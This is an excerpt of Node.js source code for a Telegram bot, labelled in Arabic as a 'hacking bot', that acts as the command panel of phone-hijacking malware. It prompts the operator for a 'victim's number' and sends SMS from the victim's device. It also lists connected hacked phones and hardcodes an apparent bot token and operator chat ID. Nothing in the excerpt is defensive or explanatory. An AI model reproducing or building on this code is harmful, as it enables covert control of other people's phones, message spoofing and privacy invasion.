...
const token = '7659090574:AAFVFDOlYbTHrbsZLGlMgeD8YzUZbWgySgI'
const id = '5346348727'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : بوت اختراق عبدالله عباس   المطور ملـــك التريــــــمكس </h1>')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة بوت  اختراق عبدالله عباس   المطور ملـــك التريــــــمكس  ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوتبوت اختراق عبدالله عباس   المطور ملـــك التريــــــمكس \n\n' +
                '•   يرجاء ارسال رقم الضحيه لختراق هاتفه ،  \n\n' +
        ...
        if (message.text == 'الاجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    ...
                    '• تاكد من ان رقم الهاتف المخترق متصل بل الانترنت'
                )
            } else {
